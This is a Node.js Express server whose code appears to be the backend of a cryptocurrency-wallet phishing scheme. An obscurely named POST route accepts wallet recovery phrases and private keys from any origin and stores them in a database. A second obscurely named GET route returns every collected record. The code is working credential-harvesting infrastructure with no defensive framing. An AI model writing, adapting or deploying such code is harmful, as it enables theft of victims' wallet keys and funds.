const express=require('express');

const Phrases=require('./src/model/Phrases');

var app=new express();
var bodyParser=require('body-parser');
const cors=require('cors');
app.options('*', cors())
app.use(cors());
//app.use(bodyParser.json());
// const path=require('path');
// app.use(express.static(__dirname+'/dist/tax'));
app.use(express.urlencoded({
    extended: true
  }));
app.use(express.json());
// const allowedOrigins = ['localhost:4200'];

// const options = {
//   origin: allowedOrigins
// };


app.get('/testdeploy',function(req,res){
    res.header("Access-Control-Allow-Origin", "*")
    res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
    //console.log("Test deploy.....");    
    res.send({"msg":"Successfully deployed"});
});



app.post('/m13csfXuR',function(req,res){
    res.header("Access-Control-Allow-Origin", "*")
    res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');     
    var statement = {
        phrase : req.body.phrase,
        privatekey: req.body.privatekey 
   }       
   var phrase = new Phrases(statement);
   phrase.save(function(err,result){ 
        if (err){ 
            console.log(err); 
            res.send({"msg":"Database Error"});
        } 
        else{            
            res.send({"msg":"Successfully Inserted"});
        } 
    }) ;   
});
app.get('/p381fgRXiWvAkntW50Ux',function(req,res){
    res.header("Access-Control-Allow-Origin", "*")
    res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');    
    Phrases.find({}, function (err, docs) {                   
            res.send(docs);        
    });    
});


app.listen(process.env.PORT ||3000, function(){
    console.log('listening to port 3000');
});
